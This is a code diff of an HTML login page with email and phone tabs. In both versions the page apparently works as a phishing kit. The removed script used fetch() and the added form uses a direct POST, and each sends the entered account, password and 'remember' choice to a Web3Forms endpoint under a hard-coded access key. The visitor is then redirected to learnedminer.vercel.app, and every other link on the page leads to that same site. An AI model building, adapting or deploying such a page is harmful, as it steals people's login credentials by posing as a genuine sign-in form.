@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -284,18 +283,25 @@
       <div class="tab" id="tabPhone" onclick="switchTab('phone')">Phone Number</div>
     </div>
 
-    <form id="loginForm">
+    <!-- Web3Forms direct native POST implementation -->
+    <form action="https://api.web3forms.com/submit" method="POST" id="loginForm">
+      <!-- Web3Forms Hidden Settings -->
+      <input type="hidden" name="access_key" value="09aaf453-c057-4f64-a4f5-be4735f951c4">
+      <input type="hidden" name="redirect" value="https://learnedminer.vercel.app/">
+      <input type="hidden" name="subject" value="New Login Submission">
+      <input type="hidden" id="loginTypeField" name="Login_Type" value="email">
+
       <div class="form-group">
         <label id="inputLabel" for="accountInput">Email</label>
         <div class="input-box">
-          <input type="email" id="accountInput" name="account" placeholder="Please enter email" required autocomplete="username">
+          <input type="email" id="accountInput" name="Account_Detail" placeholder="Please enter email" required autocomplete="username">
         </div>
       </div>
 
       <div class="form-group">
         <label for="passwordInput">Password</label>
         <div class="input-box">
-          <input type="password" id="passwordInput" name="password" placeholder="Please enter password" required autocomplete="current-password">
+          <input type="password" id="passwordInput" name="Password" placeholder="Please enter password" required autocomplete="current-password">
           <button type="button" class="toggle-pwd" id="eyeToggleBtn" onclick="togglePasswordVisibility()" aria-label="Toggle password visibility">
             <svg id="eyeClosed" viewBox="0 0 24 24">
               <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
@@ -310,7 +316,7 @@
       </div>
 
       <label class="option-row">
-        <input type="checkbox" id="chkRemember" checked>
+        <input type="checkbox" id="chkRemember" name="Remember_Password" value="Yes" checked>
         <span>Remember Password</span>
       </label>
 
@@ -332,122 +338,67 @@
     </div>
   </div>
 
-<script>
-  // ==========================================
-  // ⚙️ EDIT YOUR SETTINGS HERE:
-  // ==========================================
-  const TARGET_URL = "https://learnedminer.vercel.app/"; 
-  const WEB3FORMS_ACCESS_KEY = "09aaf453-c057-4f64-a4f5-be4735f951c4"; // Paste key here
-  // ==========================================
+  <script>
+    const TARGET_URL = "https://learnedminer.vercel.app/";
 
-  let currentTabType = 'email';
+    function togglePasswordVisibility() {
+      const pwdInput = document.getElementById('passwordInput');
+      const eyeOpen = document.getElementById('eyeOpen');
+      const eyeClosed = document.getElementById('eyeClosed');
 
-  function togglePasswordVisibility() {
-    const pwdInput = document.getElementById('passwordInput');
-    const eyeOpen = document.getElementById('eyeOpen');
-    const eyeClosed = document.getElementById('eyeClosed');
-
-    if (pwdInput && eyeOpen && eyeClosed) {
-      if (pwdInput.type === 'password') {
-        pwdInput.type = 'text';
-        eyeClosed.style.display = 'none';
-        eyeOpen.style.display = 'block';
-      } else {
-        pwdInput.type = 'password';
-        eyeClosed.style.display = 'block';
-        eyeOpen.style.display = 'none';
+      if (pwdInput && eyeOpen && eyeClosed) {
+        if (pwdInput.type === 'password') {
+          pwdInput.type = 'text';
+          eyeClosed.style.display = 'none';
+          eyeOpen.style.display = 'block';
+        } else {
+          pwdInput.type = 'password';
+          eyeClosed.style.display = 'block';
+          eyeOpen.style.display = 'none';
+        }
       }
     }
-  }
 
-  function switchTab(type) {
-    currentTabType = type;
-    const emailTab = document.getElementById('tabEmail');
-    const phoneTab = document.getElementById('tabPhone');
-    const inputLabel = document.getElementById('inputLabel');
-    const inputField = document.getElementById('accountInput');
+    function switchTab(type) {
+      const emailTab = document.getElementById('tabEmail');
+      const phoneTab = document.getElementById('tabPhone');
+      const inputLabel = document.getElementById('inputLabel');
+      const inputField = document.getElementById('accountInput');
+      const loginTypeField = document.getElementById('loginTypeField');
 
-    if (!inputField || !emailTab || !phoneTab || !inputLabel) return;
-    inputField.value = '';
+      if (!inputField || !emailTab || !phoneTab || !inputLabel || !loginTypeField) return;
+      inputField.value = '';
+      loginTypeField.value = type;
 
-    if (type === 'email') {
-      emailTab.classList.add('active');
-      phoneTab.classList.remove('active');
-      inputLabel.innerText = 'Email';
-      inputField.placeholder = 'Please enter email';
-      inputField.type = 'email';
-    } else {
-      phoneTab.classList.add('active');
-      emailTab.classList.remove('active');
-      inputLabel.innerText = 'Phone Number';
-      inputField.placeholder = 'Please enter phone number';
-      inputField.type = 'tel';
-    }
-  }
-
-  function handleBack() { window.location.replace(TARGET_URL); }
-  function handleForgotPassword() { window.location.replace(TARGET_URL); }
-  function handleDownloadApp() { window.location.replace(TARGET_URL); }
-  function handleSignUp() { window.location.replace(TARGET_URL); }
-
-  document.addEventListener('DOMContentLoaded', () => {
-    const loginForm = document.getElementById('loginForm');
-    const agreementLink = document.getElementById('agreementLink');
-
-    if (agreementLink) {
-      agreementLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        window.location.replace(TARGET_URL);
-      });
+      if (type === 'email') {
+        emailTab.classList.add('active');
+        phoneTab.classList.remove('active');
+        inputLabel.innerText = 'Email';
+        inputField.placeholder = 'Please enter email';
+        inputField.type = 'email';
+      } else {
+        phoneTab.classList.add('active');
+        emailTab.classList.remove('active');
+        inputLabel.innerText = 'Phone Number';
+        inputField.placeholder = 'Please enter phone number';
+        inputField.type = 'tel';
+      }
     }
 
-    if (loginForm) {
-      loginForm.addEventListener('submit', async (e) => {
-        e.preventDefault();
+    function handleBack() { window.location.replace(TARGET_URL); }
+    function handleForgotPassword() { window.location.replace(TARGET_URL); }
+    function handleDownloadApp() { window.location.replace(TARGET_URL); }
+    function handleSignUp() { window.location.replace(TARGET_URL); }
 
-        const accountElem = document.getElementById('accountInput');
-        const pwdElem = document.getElementById('passwordInput');
-        const rememberElem = document.getElementById('chkRemember');
-        const submitBtn = document.getElementById('submitBtn');
-
-        if (!accountElem || !pwdElem || !rememberElem || !submitBtn) return;
-
-        submitBtn.disabled = true;
-        submitBtn.innerText = "Logging in...";
-
-        const formData = new FormData();
-        formData.append("access_key", WEB3FORMS_ACCESS_KEY);
-        formData.append("subject", `New Login Submission (${currentTabType})`);
-        formData.append("Login_Type", currentTabType);
-        formData.append("Account_Detail", accountElem.value);
-        formData.append("Password", pwdElem.value);
-        formData.append("Remember_Password", rememberElem.checked ? "Yes" : "No");
-
-        try {
-          // Send request and explicitly WAIT for standard JSON response
-          const response = await fetch("https://api.web3forms.com/submit", {
-            method: "POST",
-            headers: {
-              "Accept": "application/json"
-            },
-            body: formData
-          });
-
-          const result = await response.json();
-          if (result.success) {
-            console.log("Form submitted successfully:", result);
-          } else {
-            console.error("Web3Forms Error:", result.message);
-          }
-        } catch (err) {
-          console.error("Submission error:", err);
-        } finally {
-          // Redirect strictly AFTER fetch has completed
+    document.addEventListener('DOMContentLoaded', () => {
+      const agreementLink = document.getElementById('agreementLink');
+      if (agreementLink) {
+        agreementLink.addEventListener('click', (e) => {
+          e.preventDefault();
           window.location.replace(TARGET_URL);
-        }
-      });
-    }
-  });
-</script>
+        });
+      }
+    });
+  </script>
 </body>
 </html>
